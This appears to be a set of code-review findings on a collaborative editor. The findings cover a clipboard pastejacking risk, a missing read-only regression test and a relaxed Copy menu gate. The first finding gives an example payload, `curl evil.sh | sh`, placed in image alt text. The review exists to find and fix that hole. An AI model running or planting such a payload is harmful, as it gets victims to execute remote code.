samples.summary: New image-copy path writes unsanitized, attacker-influenced image `alt` text into the clipboard's `text/plain` flavour (pastejacking vector)
samples.evidence: `writeImageToClipboard` does `e.clipboardData?.setData('text/plain', image.alt ?? '')`. `alt` is never rendered on the canvas (it only surfaces in markdown/docx export, serialize/markdown.ts:234), so it is invisible content, and it is not first-party-controlled: `sanitizeImageData` (view/clipboard.ts:110-128) accepts any string for `alt` from a pasted `application/x-waffledocs` payload, and yorkie-doc-store.ts:206-207 syncs `image.alt` verbatim from a co-editor. Attack: a co-editor on a shared doc (or a crafted clipboard payload the victim pastes) sets an image's alt to `\ncurl evil.sh | sh\n`; the victim clicks that image and presses Cmd/Ctrl+C expecting to copy a picture, and their plain-text clipboard now holds attacker-chosen multi-line text. Pasted into a terminal, the trailing newline auto-executes it. There is no length cap and no newline/control-character stripping on the value. Note the analogous text-copy path only ever writes text the user can see and selected. Suggest stripping newlines/control chars and capping length, or writing a neutral placeholder instead of alt.

samples.summary: The new read-only guard on inline image deletion has no regression test, in a file whose sibling tests otherwise pin read-only enforcement
samples.evidence: `deleteSelectedImageInline` adds `if (readOnly || !selectedImage) return;` — the enforcement point for the read-only hole the task doc describes (`imageKeyHandler` runs before `handleKeyDown`'s read-only early-return at text-editor.ts:883, so Delete/Backspace on a click-selected image previously mutated a read-only document). Nothing exercises it: the new `copy-integrity.test.ts` always builds its editor via `initialize(container, store)` with no readOnly argument, and `packages/docs/test/view/editor-read-only.test.ts` — the file that does construct a read-only editor (line 61) — contains no occurrence of `image` at all. Deleting the `readOnly ||` clause would leave every suite green, so the guard can silently regress. It is currently defence-in-depth (in read-only, `handleImageMouseDown` returns at editor.ts:2454 so no click can set `selectedImage`, and `selectImageAt` is unused by the frontend), which is exactly why a test is what would keep it correct if either of those changes.
searchedFor: Grep 'selectImageAt|imageKeyHandler|Backspace' across packages/docs/test (9 files matched; only copy-integrity.test.ts and editor-read-only.test.ts relevant)
Read of the full new test file copy-integrity.test.ts (setupEditor passes no readOnly flag)

samples.summary: Context-menu Copy gate relaxed to ignore `readOnly`; correct today, but it is now the only place recording that viewers may copy
samples.evidence: `showCopy = hasSelection` drops the previous `&& !readOnly`. I confirmed this crosses no enforced boundary: share roles are only `viewer`/`editor` (packages/frontend/src/app/shared/shared-document.tsx:152, 278, 318, 368, 395, 683), there is no `canCopy`/`canDownload` capability anywhere, `handleKeyDown` already lets plain Cmd/Ctrl+C through in read-only (packages/docs/src/view/text-editor.ts:896-898), and `editor.copy()` (editor.ts:3333) only calls `execCommand('copy')`, which routes to `handleCopy` — a non-mutating handler. Recording it only so that if a future 'view without copy' role is introduced, this line and text-editor.ts:896 are the two client-side sites that would need it; neither is an enforcement point a server could rely on.
